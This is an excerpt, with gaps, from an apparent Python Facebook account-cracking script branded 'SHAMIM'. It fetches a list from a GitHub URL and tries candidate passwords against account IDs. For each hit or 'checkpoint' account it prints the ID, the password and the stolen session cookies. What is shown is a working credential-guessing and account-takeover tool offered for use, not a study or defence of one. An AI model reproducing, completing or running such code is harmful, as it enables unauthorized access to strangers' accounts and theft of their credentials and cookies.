...
princp=[]
try:
	prox= requests.get('https://github.com/Shamim20BD/SS-Paid/blob/main/Afroveal.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Shamim20BD/SS-Paid/blob/main/Afroveal.txt').text
		ua=open('.bbnew.txt','w')
...
def login():
	...
	if SHAMIM in ['m']:
		...
		os.system('xdg-open https://wa.me/+966500452461')
	elif SHAMIM in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#SHAMIM-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•SHAMIM-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#SHAMIM-King
				print(f'\r\033[0;92m[SHAMIM-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
